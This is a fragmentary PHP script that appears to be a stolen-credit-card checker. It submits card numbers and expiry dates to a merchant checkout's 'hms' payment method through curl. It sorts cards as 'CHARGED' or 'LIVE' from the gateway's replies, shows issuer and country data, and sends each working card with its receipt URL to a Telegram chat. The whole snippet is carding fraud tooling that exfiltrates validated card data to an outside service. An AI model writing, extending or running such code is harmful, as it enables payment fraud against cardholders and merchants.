...
$paymentMethods = [
    ...
    'hms' => '/<input[^>]*name="payment_method"[^>]*value="hms"/'
    ];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
 ...
 //   'wc-usa-epay-credit-card-context' => 'shortcode',
    'hms-card-number' => $cc,
    'hms-card-expiry' => $mes_with_zero . ' / ' . $ano_no_20,
...
if ($result === 'success') { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED HMS]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

} elseif (strpos($msg, 'Payment error - Not sufficient funds') !== false) {
    ...
    <span style="color: #ff7809ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CVV]- $lista [CVV LIVE HMS]
